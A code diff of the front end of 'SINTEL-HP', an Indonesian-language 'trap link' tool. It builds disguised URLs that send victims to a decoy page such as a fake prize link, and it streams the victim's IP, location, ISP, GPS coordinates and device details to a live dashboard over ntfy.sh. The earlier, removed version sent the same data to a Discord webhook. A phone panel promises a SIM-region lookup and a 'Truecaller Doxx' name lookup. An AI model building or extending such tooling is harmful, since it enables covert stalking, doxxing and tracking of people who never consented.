@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SINTEL-HP | Real-time IP Logger</title>
+    <title>SINTEL-HP | Real-time Target Logger</title>
     <link
         href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap"
         rel="stylesheet">
@@ -16,6 +16,7 @@
             --accent-glow: rgba(255, 0, 85, 0.4);
             --primary: #00f0ff;
             --primary-glow: rgba(0, 240, 255, 0.4);
+            --success: #00ff88;
             --text-main: #ffffff;
             --text-dim: #888888;
             --card-bg: rgba(20, 20, 20, 0.6);
@@ -106,7 +107,6 @@
             padding: 2.5rem;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
             position: relative;
-            overflow: hidden;
         }
 
         .input-group {
@@ -138,11 +138,6 @@
         .styled-input:focus {
             border-color: var(--primary);
             box-shadow: 0 0 15px var(--primary-glow);
-        }
-
-        .styled-input.red:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 15px var(--accent-glow);
         }
 
         .btn-lacak {
@@ -194,37 +189,75 @@
         .result-value {
             font-family: 'Space Mono', monospace;
             font-weight: 700;
+            text-align: right;
         }
 
-        .trap-result {
+        /* Dashboard Styles */
+        .live-dash {
             margin-top: 1.5rem;
-            background: rgba(255, 0, 85, 0.1);
-            padding: 1.5rem;
+            border: 1px solid var(--glass-border);
             border-radius: 12px;
-            border: 1px solid var(--accent);
+            background: rgba(0, 0, 0, 0.8);
+            padding: 1.5rem;
             display: none;
+            position: relative;
+            overflow: hidden;
         }
 
-        .trap-link {
+        .pulse-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background-color: var(--success);
+            border-radius: 50%;
+            margin-right: 8px;
+            box-shadow: 0 0 10px var(--success);
+            animation: pulse 1.5s infinite;
+        }
+
+        .log-entry {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            border-left: 3px solid var(--accent);
+            animation: slideUp 0.3s ease-out forwards;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
+        }
+
+        .log-entry pre {
+            margin-top: 8px;
+            color: var(--primary);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .log-link {
+            color: var(--success);
+            text-decoration: underline;
+        }
+
+        .trap-linkbox {
             font-family: 'Space Mono', monospace;
             color: #fff;
             background: #000;
             padding: 1rem;
             border-radius: 8px;
             word-break: break-all;
-            margin-top: 1rem;
-            border: 1px dotted var(--accent);
+            margin: 1rem 0;
+            border: 1px dashed var(--accent);
+            text-align: center;
+            font-size: 0.85rem;
         }
 
-        .copy-btn {
-            background: var(--accent);
-            border: none;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 6px;
-            margin-top: 10px;
-            cursor: pointer;
-            font-family: 'Space Mono', monospace;
+        #panelTracker,
+        #panelTrap {
+            display: none;
+        }
+
+        .active-panel {
+            display: block !important;
         }
 
         @keyframes float {
@@ -251,6 +284,23 @@
             }
         }
 
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.5;
+                transform: scale(1.5);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
         .loader {
             display: none;
             width: 24px;
@@ -266,15 +316,6 @@
                 transform: rotate(360deg);
             }
         }
-
-        #panelTracker,
-        #panelTrap {
-            display: none;
-        }
-
-        .active-panel {
-            display: block !important;
-        }
     </style>
 </head>
 
@@ -282,53 +323,21 @@
 
     <div class="header">
         <h1 class="title">SINTEL-HP</h1>
-        <p class="subtitle">Real-time Location Tracker & IP Logger</p>
+        <p class="subtitle">Live Tracker & HLR Region Lookup</p>
     </div>
 
     <div class="container">
         <div class="tabs">
-            <div class="tab active" onclick="switchTab('panelTracker', this)">1. TRAP BUILDER ☠️</div>
-            <div class="tab" onclick="switchTab('panelTrap', this)">2. NOMOR INFO 📱</div>
+            <div class="tab" onclick="switchTab('panelTrap', this)">1. LACAK NOMOR (HLR) 📱</div>
+            <div class="tab active" onclick="switchTab('panelTracker', this)">2. LIVE GPS TRACKER 🌍</div>
         </div>
 
         <div class="glass-panel">
 
-            <!-- PANEL 1: IP TARGET LOGGER (REAL) -->
-            <div id="panelTracker" class="active-panel">
-                <p style="color:var(--text-dim); margin-bottom: 1.5rem;">Buat link jebakan REAL di sini. Pas target
-                    ngeklik, titik koordinat Maps & IP-nya langsung diforward ke channel Discord lu!</p>
-
-                <div class="input-group">
-                    <input type="text" id="webhookInput" class="styled-input red"
-                        placeholder="Discord Webhook URL (Wajib)" autocomplete="off">
-                    <div class="icon-wrapper"><i data-lucide="bell"></i></div>
-                </div>
-
-                <div class="input-group">
-                    <input type="text" id="targetUrlInput" class="styled-input"
-                        placeholder="Web Asli buat ngecoh (ex: imgur.com/bukti)" value="https://imgur.com/">
-                    <div class="icon-wrapper"><i data-lucide="link"></i></div>
-                </div>
-
-                <button class="btn-lacak" onclick="generateTrap()">
-                    <span>BUAT LINK PELACAK LOKASI</span>
-                    <i data-lucide="crosshair"></i>
-                </button>
-
-                <div class="trap-result" id="trapResult">
-                    <h3 style="color:var(--accent); margin-bottom: 0.5rem;"><i data-lucide="shield-alert"
-                            style="display:inline-block; vertical-align:middle;"></i> BERHASIL DIBUAT!</h3>
-                    <p style="font-size: 0.9rem;">Copy link di bawah ini dan kirim ke target. Begitu dia buka, lokasinya
-                        bakal dikirim LIVE ke Discord lu.</p>
-                    <div class="trap-link" id="generatedLink"></div>
-                    <button class="copy-btn" onclick="copyTrapLink()">COPY LINK TRACKER</button>
-                </div>
-            </div>
-
-            <!-- PANEL 2: PHONE LOOKUP -->
+            <!-- PANEL 1: PHONE LOOKUP -->
             <div id="panelTrap">
-                <p style="color:var(--text-dim); margin-bottom: 1.5rem;">Cek validasi & provider nomor telepon target.
-                </p>
+                <p style="color:var(--text-dim); margin-bottom: 1.5rem;">Cek Lokasi Registrasi SIM (HLR) dan Provider
+                    Info.</p>
                 <div class="input-group">
                     <input type="text" id="phoneInput" class="styled-input" placeholder="08123456789 (Tanpa spasi)"
                         autocomplete="off">
@@ -337,12 +346,48 @@
 
                 <button class="btn-lacak" style="background: linear-gradient(135deg, var(--primary), #0088cc);"
                     onclick="lacakNomor()">
-                    <span id="btnText">CEK PROVIDER</span>
+                    <span id="btnText">CEK KOORDINAT NOMOR</span>
                     <i data-lucide="smartphone" id="btnIcon"></i>
-                    <div class="loader" id="loader"></div>
+                    <div class="loader" id="loader1"></div>
                 </button>
 
-                <div class="result-box" id="resultBox"></div>
+                <div class="result-box" id="resultBoxNum"></div>
+            </div>
+
+            <!-- PANEL 2: LIVE TRACKER / DASHBOARD -->
+            <div id="panelTracker" class="active-panel">
+                <div id="setupView">
+                    <p style="color:var(--text-dim); margin-bottom: 1.5rem;">
+                        <b>[FITUR GPS REAL-TIME]</b><br>
+                        Sistem pelacakan akurat butuh pancingan ke HP target. Generate link jebakan lu buat dapetin
+                        kordinat live-nya. Ga perlu Discord lagi!
+                    </p>
+                    <div class="input-group">
+                        <input type="text" id="targetUrlInput" class="styled-input"
+                            placeholder="Web Palsu (ex: s.id/Hadiah-mu)" value="https://google.com">
+                        <div class="icon-wrapper"><i data-lucide="link"></i></div>
+                    </div>
+                    <button class="btn-lacak" onclick="generateTracker()">BUAT TRACKING LINK & BUKA DASHBOARD</button>
+                </div>
+
+                <div class="live-dash" id="dashboardView">
+                    <div
+                        style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:1rem; margin-bottom: 1rem;">
+                        <span style="font-weight:600; color:var(--success);"><span class="pulse-indicator"></span>
+                            LISTENING PING...</span>
+                        <i data-lucide="radar" style="color:var(--primary);"></i>
+                    </div>
+
+                    <p style="font-size:0.9rem; color:var(--text-dim);">Kirim URL jebakan di bawah ini ke target. Jangan
+                        tutup halaman ini, kalo diklik koordinat akan muncul otomatis!</p>
+
+                    <div class="trap-linkbox" id="displayTrapLink" onclick="copyTrapLink()" style="cursor:pointer;"
+                        title="Klik Untuk Copy"></div>
+
+                    <div id="logsContainer">
+                        <!-- Logs injected here -->
+                    </div>
+                </div>
             </div>
 
         </div>
@@ -350,6 +395,7 @@
 
     <script>
         lucide.createIcons();
+        let eventSource = null;
 
         function switchTab(panelId, element) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -359,55 +405,89 @@
             document.getElementById(panelId).classList.add('active-panel');
         }
 
-        function generateTrap() {
-            const webhook = document.getElementById('webhookInput').value;
-            const targetUrl = document.getElementById('targetUrlInput').value || 'https://google.com';
-
-            if (!webhook.includes('discord.com/api/webhooks')) {
-                return alert('Wah ngab, lu wajib masukin URL Webhook Discord lu biar lokasinya bisa ke-kirim!');
-            }
-
-            const wBase = btoa(webhook);
-            const tBase = btoa(targetUrl);
-            const trapUrl = `${window.location.origin}/api/trap?w=${wBase}&t=${tBase}`;
-
-            document.getElementById('generatedLink').innerText = trapUrl;
-            document.getElementById('trapResult').style.display = 'block';
-        }
-
-        function copyTrapLink() {
-            const link = document.getElementById('generatedLink').innerText;
-            navigator.clipboard.writeText(link);
-            alert('Link jebakan udah kecopy! Tinggal umpanin ke penipu.');
-        }
-
         async function lacakNomor() {
             const input = document.getElementById('phoneInput').value;
-            if (!input) return alert('Masukin nomornya dlu banh!');
+            if (!input) return alert('Masukin nomornya boss!');
 
             document.getElementById('btnText').style.display = 'none';
             document.getElementById('btnIcon').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
+            document.getElementById('loader1').style.display = 'block';
 
             try {
                 const res = await fetch(`/api/lookup?number=${input}`);
                 const info = await res.json();
+                if (!info.valid) throw new Error(info.error || 'Nomor tidak terdeteksi jaringan');
 
-                if (!info.valid) throw new Error(info.error || 'Nomor tidak valid');
-
-                document.getElementById('resultBox').innerHTML = `
-                    <div class="result-item"><span class="result-label">Format Global</span><span class="result-value">${info.formatted}</span></div>
-                    <div class="result-item"><span class="result-label">Provider</span><span class="result-value">${info.carrier}</span></div>
-                    <div class="result-item"><span class="result-label">Tipe</span><span class="result-value">${info.type}</span></div>
+                document.getElementById('resultBoxNum').innerHTML = `
+                    <div class="result-item"><span class="result-label">Status Nomor</span><span class="result-value" style="color:var(--success)">AKTIF MENGUDARA</span></div>
+                    <div class="result-item"><span class="result-label">Loc Asal SIM (HLR)</span><span class="result-value" style="color:#ffcc00">${info.hlrRegion}</span></div>
+                    <div class="result-item"><span class="result-label">Provider Network</span><span class="result-value">${info.carrier}</span></div>
+                    <div class="result-item"><span class="result-label">Truecaller Doxx</span><span class="result-value">${info.truecallerName}</span></div>
                 `;
-                document.getElementById('resultBox').style.display = 'block';
+                document.getElementById('resultBoxNum').style.display = 'block';
             } catch (err) {
-                alert(`Error: ${err.message}`);
+                alert(`Gagal Banh: ${err.message}`);
             }
 
             document.getElementById('btnText').style.display = 'block';
             document.getElementById('btnIcon').style.display = 'block';
-            document.getElementById('loader').style.display = 'none';
+            document.getElementById('loader1').style.display = 'none';
+        }
+
+        function generateTracker() {
+            const target = document.getElementById('targetUrlInput').value;
+            // Buat room random unik u/ tracking (Pub/Sub via ntfy stateless)
+            const topicId = 'sintel_' + Math.random().toString(36).substring(2, 10);
+            const tBase = btoa(target);
+
+            const trapLink = `${window.location.origin}/api/trap?topic=${topicId}&t=${tBase}`;
+
+            document.getElementById('setupView').style.display = 'none';
+            document.getElementById('dashboardView').style.display = 'block';
+            document.getElementById('displayTrapLink').innerText = trapLink;
+
+            // Start Listening ke jaringan ntfy
+            listenToDashboard(topicId);
+        }
+
+        function copyTrapLink() {
+            navigator.clipboard.writeText(document.getElementById('displayTrapLink').innerText);
+            alert("Copied! Tempel & Kirim ke WhatsApp/Sosmed target.");
+        }
+
+        function listenToDashboard(topic) {
+            if (eventSource) eventSource.close();
+            // Connect to free Ntfy SSE Push Notification server
+            eventSource = new EventSource(`https://ntfy.sh/${topic}/sse`);
+
+            eventSource.addEventListener('message', (e) => {
+                const data = JSON.parse(e.data);
+                if (data.event === 'message' && data.message) {
+                    try {
+                        const tgt = JSON.parse(data.message);
+                        const mapsLink = tgt.lat ? `https://www.google.com/maps?q=${tgt.lat},${tgt.lon}` : null;
+
+                        const logHtml = `
+                            <div class="log-entry">
+                                <div style="color:white; font-weight:bold; margin-bottom:5px;">⚠️ PING MASUK DARI TARGET! ⚠️</div>
+                                <div style="color:var(--text-dim); margin-bottom:8px;">Jam: ${new Date(tgt.time).toLocaleTimeString()} WIB</div>
+                                <div><strong>IP:</strong> ${tgt.ip}</div>
+                                <div><strong>Lokasi:</strong> ${tgt.city}, ${tgt.region} (${tgt.country})</div>
+                                <div><strong>ISP / Provider:</strong> ${tgt.isp}</div>
+                                ${mapsLink ? `<div><strong>GPS Target:</strong> <a href="${mapsLink}" target="_blank" class="log-link">Buka Google Maps</a></div>` : ''}
+                                <details style="margin-top:10px; cursor:pointer;">
+                                    <summary style="color:var(--text-dim)">Detail Hape / Browser (Klik)</summary>
+                                    <pre>${tgt.ua}</pre>
+                                </details>
+                            </div>
+                        `;
+                        document.getElementById('logsContainer').insertAdjacentHTML('afterbegin', logHtml);
+
+                        // play sound alert
+                        try { new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg').play(); } catch (e) { }
+                    } catch (e) { console.error('Payload parse failed'); }
+                }
+            });
         }
     </script>
 </body>
